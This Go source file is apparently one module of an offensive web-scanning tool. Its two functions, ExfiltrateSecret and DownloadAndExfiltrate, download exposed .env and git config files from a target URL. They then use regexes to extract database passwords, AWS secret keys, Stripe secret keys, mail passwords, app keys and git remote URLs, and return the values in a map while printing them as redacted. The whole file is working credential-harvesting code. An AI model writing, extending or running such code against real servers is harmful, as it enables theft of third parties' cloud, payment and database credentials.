package engine

import (
	"fmt"
	"io"
	"regexp"
	"strings"
)

// ExfiltrateSecret parses content of sensitive files like .env
func (e *Engine) ExfiltrateSecret(target, filename, content string) map[string]string {
	results := make(map[string]string)

	if strings.Contains(filename, ".env") {
		fmt.Printf("    [!] Parsing .env for sensitive keys...\n")
		patterns := map[string]*regexp.Regexp{
			"DB_PASSWORD":   regexp.MustCompile(`DB_PASSWORD=(.*)`),
			"DB_HOST":       regexp.MustCompile(`DB_HOST=(.*)`),
			"APP_KEY":       regexp.MustCompile(`APP_KEY=(.*)`),
			"AWS_SECRET":    regexp.MustCompile(`AWS_SECRET_ACCESS_KEY=(.*)`),
			"STRIPE_KEY":    regexp.MustCompile(`STRIPE_SECRET_KEY=(.*)`),
			"MAIL_PASSWORD": regexp.MustCompile(`MAIL_PASSWORD=(.*)`),
		}

		for key, re := range patterns {
			match := re.FindStringSubmatch(content)
			if len(match) > 1 {
				val := strings.TrimSpace(match[1])
				if val != "" && val != "\"\"" && val != "''" {
					results[key] = val
					fmt.Printf("        - Found %s: [REDACTED]\n", key)
				}
			}
		}
	} else if strings.Contains(filename, "config") {
		// logic for git config etc.
		if strings.Contains(content, "[remote \"origin\"]") {
			re := regexp.MustCompile(`url = (.*)`)
			match := re.FindStringSubmatch(content)
			if len(match) > 1 {
				results["GIT_REMOTE"] = strings.TrimSpace(match[1])
			}
		}
	}

	return results
}

// DownloadAndExfiltrate downloads a file and extracts its secrets
func (e *Engine) DownloadAndExfiltrate(url string) map[string]string {
	resp, err := e.Client.Get(url)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return e.ExfiltrateSecret(url, url, string(body))
}
